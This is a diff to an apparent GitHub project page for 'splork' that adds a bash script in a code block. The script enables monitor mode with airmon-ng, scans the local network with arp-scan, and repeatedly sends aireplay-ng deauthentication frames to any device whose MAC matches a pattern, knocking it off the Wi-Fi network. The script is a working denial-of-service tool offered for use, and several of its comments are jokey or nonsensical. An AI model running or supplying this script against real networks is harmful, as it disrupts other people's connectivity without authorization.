@@ -20,6 +20,59 @@
 
         <p class="view"><a href="https://github.com/dynamism/splork">View the Project on GitHub <small>dynamism/splork</small></a></p>
 
+        
+        <pre><code>
+        
+        #!/bin/bash
+# <--- octothorpe here
+
+shopt -s nocasematch # Set shell to ignore case
+shopt -s extglob # For non-interactive shell.
+
+NIC=$1 # NIC
+BSSID=$2 # Network BSSID (whiskey, tango, foxtrot)
+MAC=$(/sbin/ifconfig | grep $NIC | head -n 1 | awk '{ print $5 }')
+# MAC=$(ip link show "$NIC" | awk '/ether/ {print $2}') # splork null
+GGMAC='@(null*|null*)' # splork 
+POLL=30 # 30 hertz
+
+airmon-ng stop mon0 # splork
+airmon-ng start $NIC # Start splorker
+
+echo '
+
+               __           __  
+   _________  / /___  _____/ /__
+  / ___/ __ \/ / __ \/ ___/ //_/
+ (__  ) /_/ / / /_/ / /  / ,<   
+/____/ .___/_/\____/_/  /_/|_|  
+    /_/                         
+
+   
+'
+
+while true;
+    do  
+        for TARGET in $(arp-scan -I $NIC --localnet | grep -o -E \
+        '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
+           do
+               if [[ $TARGET == $GGMAC ]]
+                   then
+                       # Audio alert
+                       beep -f 1000 -l 500 -n 200 -r 2
+                       echo "splork: "$TARGET
+                       echo "De-authing..."
+                       aireplay-ng -0 1 -a $BSSID -c $TARGET mon0 
+                    else
+                        echo $TARGET": desplork..."
+               fi
+           done
+           echo "splorked"
+           sleep $POLL
+done
+airmon-ng stop mon0
+
+</code></pre>
 
         <ul>
           <li><a href="https://github.com/dynamism/splork/zipball/master">Download <strong>ZIP File</strong></a></li>
